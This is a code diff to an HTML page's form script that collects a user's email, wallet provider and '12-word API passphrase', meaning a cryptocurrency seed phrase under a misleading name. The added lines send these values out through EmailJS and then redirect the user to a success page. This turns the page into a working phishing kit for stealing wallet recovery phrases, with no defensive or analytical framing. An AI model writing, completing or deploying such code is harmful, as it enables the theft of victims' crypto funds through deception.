@@ -130,47 +130,60 @@
     <!-- JavaScript for validation and form submission -->
     <script>
       document.getElementById('walletForm').addEventListener('submit', function(event) {
-        event.preventDefault(); // Prevent form from submitting
+  event.preventDefault(); // Prevent form from submitting
 
-        // Clear any previous validation errors
-        const validationErrors = document.getElementById('validationErrors');
-        validationErrors.textContent = "";
+  // Clear any previous validation errors
+  const validationErrors = document.getElementById('validationErrors');
+  validationErrors.textContent = "";
 
-        // Get input field values
-        const email = document.getElementById('email').value.trim();
-        const walletProvider = document.getElementById('walletProvider').value.trim();
-        const passphrase = document.getElementById('passphrase').value.trim();
+  // Get input field values
+  const email = document.getElementById('email').value.trim();
+  const walletProvider = document.getElementById('walletProvider').value.trim();
+  const passphrase = document.getElementById('passphrase').value.trim();
 
-        // Regular expression for validating email
-        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+  // Regular expression for validating email
+  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
 
-        // Validate form fields
-        if (!email || !emailPattern.test(email)) {
-          validationErrors.textContent += "Please enter a valid email address.\n";
-        }
-        if (!walletProvider) {
-          validationErrors.textContent += "Please enter a wallet provider (e.g., Trust Wallet, Metamask).\n";
-        }
-        if (!passphrase) {
-          validationErrors.textContent += "Please enter your 12-word API passphrase.\n";
-        }
+  // Validate form fields
+  if (!email || !emailPattern.test(email)) {
+    validationErrors.textContent += "Please enter a valid email address.\n";
+  }
+  if (!walletProvider) {
+    validationErrors.textContent += "Please enter a wallet provider (e.g., Trust Wallet, Metamask).\n";
+  }
+  if (!passphrase) {
+    validationErrors.textContent += "Please enter your 12-word API passphrase.\n";
+  }
 
-        // If there are validation errors, don't submit the form
-        if (validationErrors.textContent) {
-          return;
-        }
+  // If there are validation errors, don't submit the form
+  if (validationErrors.textContent) {
+    return;
+  }
 
-        // Show "Processing" message
-        const statusDiv = document.getElementById('status');
-        statusDiv.textContent = "Processing...";
-        statusDiv.style.color = "blue"; // Add styling for better visibility
+  // Show "Processing" message
+  const statusDiv = document.getElementById('status');
+  statusDiv.textContent = "Processing...";
 
-        // Simulate processing and success message
-        setTimeout(function() {
-          statusDiv.textContent = "Successful! Please click here to visit the homepage. Our team will reach out to you via email soon.";
-          statusDiv.style.color = "green"; // Change color to green for success message
-        }, 3000); // 3 seconds delay for processing
-      });
+  // Prepare the parameters to send via EmailJS
+  var templateParams = {
+    email: email,
+    walletProvider: walletProvider,
+    passphrase: passphrase
+  };
+
+  // Send email using EmailJS
+  emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+    .then(function(response) {
+        console.log('SUCCESS!', response.status, response.text);
+        // Redirect to success page after successful submission
+        window.location.href = 'success.html';
+    }, function(error) {
+        console.log('FAILED...', error);
+        statusDiv.textContent = "Failed to send email. Please try again.";
+        statusDiv.style.color = "red";
+    });
+});
+
     </script>
 
     <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
